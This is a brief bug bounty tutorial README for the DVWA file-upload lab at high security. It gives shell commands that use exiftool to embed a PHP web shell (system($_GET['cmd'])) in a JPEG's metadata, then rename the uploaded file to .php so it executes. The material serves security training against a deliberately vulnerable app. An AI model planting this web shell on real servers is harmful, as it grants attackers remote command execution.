# bug-bounty-tutorial
bug bounty tutorial

## 3.dvwa file upload high
```
sudo apt update
sudo apt install libimage-exiftool-perl

exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' index.jpeg

mv /usr/share/dvwa/hackable/uploads/index.jpeg /usr/share/dvwa/hackable/uploads/index.php
```
